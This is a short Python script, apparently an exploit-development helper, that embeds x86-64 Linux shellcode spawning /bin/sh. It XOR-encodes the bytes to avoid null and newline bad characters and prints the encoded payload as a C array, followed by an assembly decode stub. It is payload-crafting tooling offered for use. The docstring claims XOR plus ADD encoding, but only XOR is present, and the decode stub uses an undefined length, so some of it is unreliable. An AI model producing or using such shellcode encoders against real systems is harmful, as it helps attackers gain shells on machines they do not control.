#!/usr/bin/env python3
"""
Shellcode encoder: encodes shellcode to avoid null bytes
or bad characters using XOR + ADD encoding.
"""

shellcode = bytes([
    0x48, 0x31, 0xf6, 0x56,
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x57, 0x48, 0x89, 0xe7,
    0x48, 0x31, 0xd2,
    0xb0, 0x3b, 0x0f, 0x05
])


def xor_encode(data, key=0xaa):
    encoded = bytes(b ^ key for b in data)
    return encoded


def find_bad_chars(data, bad=b'\x00\x0a\x0d'):
    return [hex(b) for b in data if b in bad]


def print_shellcode(data, name="shellcode"):
    print(f"unsigned char {name}[] = {{")
    for i in range(0, len(data), 8):
        chunk = data[i:i+8]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        print(f"    {hex_str},")
    print(f"}};  // len={len(data)}")


if __name__ == "__main__":
    print("=== Original shellcode ===")
    print_shellcode(shellcode)

    bad = find_bad_chars(shellcode)
    print(f"\nBad chars found: {bad}")

    print("\n=== XOR-encoded (key=0xaa) ===")
    encoded = xor_encode(shellcode)
    print_shellcode(encoded, name="encoded")

    print("\n=== Decode stub (run before shellcode) ===")
    print("; Decode loop")
    print("xor ecx, ecx")
    print("decode_loop:")
    print("    xor byte [rsi + rcx], 0xaa")
    print("    inc rcx")
    print("    cmp rcx, len")
    print("    jl decode_loop")
